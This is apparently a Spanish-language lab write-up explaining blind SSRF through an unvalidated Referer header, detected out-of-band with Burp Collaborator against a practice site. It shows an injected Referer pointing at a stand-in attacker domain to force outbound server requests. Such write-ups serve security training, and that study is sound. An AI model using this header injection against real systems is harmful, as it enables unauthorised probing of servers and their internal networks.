# 🌐 SSRF ciego con detección out-of-band

## 📄 Descripción del laboratorio

Este laboratorio presenta una vulnerabilidad de **Server-Side Request Forgery (SSRF) ciego** provocada por el uso inseguro del encabezado `Referer`.

La aplicación (o un sistema de analítica asociado) realiza una **petición HTTP saliente** a la URL indicada en dicho encabezado cuando se carga una página de producto.

🎯 **Objetivo del laboratorio:**

* Forzar al servidor vulnerable a realizar una petición HTTP saliente hacia un dominio controlado por nosotros (**Burp Collaborator**)
* Confirmar la interacción **out-of-band (OOB)**



## 📚 Teoría

En este escenario tenemos un **blind SSRF puro**.

Características:

* ❌ No vemos el contenido de la respuesta del servidor interno
* ❌ No existen errores diferenciadores en la respuesta HTTP
* ✅ La explotación se confirma mediante **interacciones fuera de banda (OOB)**

Flujo vulnerable del laboratorio:

1. El usuario accede a una página de producto:

```
/product?productId=1
```

2. El navegador envía la cabecera:

```http
Referer: https://ID-DEL-LAB.web-security-academy.net/product?productId=1
```

3. Un componente interno (analítica, tracker, fetcher, etc.):

* Lee el valor de `Referer`
* Realiza una petición HTTP GET saliente a esa URL

4. No existe validación ni whitelist del dominio en el `Referer`.

Esto permite **reemplazarlo por cualquier dominio**, incluido uno controlado por el atacante.

Para confirmar la SSRF sin ver la respuesta utilizamos **Burp Collaborator**, que:

* Genera un dominio único
* Registra peticiones **DNS y HTTP entrantes**
* Permite verificar si el backend realizó la conexión



## 📝 Práctica

### 1️⃣ Interceptando la petición inicial

Abrimos cualquier página de producto, por ejemplo:

```
/product?productId=1
```

Interceptamos la petición con **Burp Suite**.

Ejemplo:

```http
GET /product?productId=1 HTTP/1.1
Host: ID-DEL-LAB.web-security-academy.net
Referer: https://ID-DEL-LAB.web-security-academy.net/product?productId=1
```

Enviamos esta petición al **Repeater**.

<img width="674" height="493" alt="image" src="https://github.com/user-attachments/assets/3bbf5030-57dc-4952-ba53-f70f41c396e0" />



### 2️⃣ Preparando el dominio OOB

Abrimos **Burp Collaborator Client**:

```
Burp → Burp Collaborator client
```

Pulsamos **Copy to clipboard**.

Obtendremos un dominio único, por ejemplo:

```
abcdef123.oastify.com
```



### 3️⃣ Inyectando el Referer malicioso

En **Repeater**, modificamos la cabecera `Referer`:

```http
Referer: http://abcdef123.oastify.com
```

Enviamos la petición varias veces.

En algunos casos los sistemas de analítica **no se activan en todas las peticiones**, por lo que puede ser necesario repetir el envío.

<img width="669" height="469" alt="image" src="https://github.com/user-attachments/assets/28c416f3-d096-4fdb-8e0f-0c33cb300ec8" />



### 4️⃣ Confirmando la interacción OOB

Volvemos al **Burp Collaborator Client** y pulsamos **Poll now**.

<img width="983" height="298" alt="image" src="https://github.com/user-attachments/assets/91c11ebb-fd04-4972-b591-042a30828b1c" />



### 5️⃣ Resultado final

En Collaborator aparecen interacciones como:

* **DNS lookup** a `abcdef123.oastify.com`
* **HTTP GET request** desde la IP del servidor vulnerable
* Cabeceras típicas de backend (User-Agent no de navegador)

Esto confirma que el servidor realizó una **petición saliente basada en nuestro Referer**, validando la vulnerabilidad SSRF.

✅ **Laboratorio resuelto.**
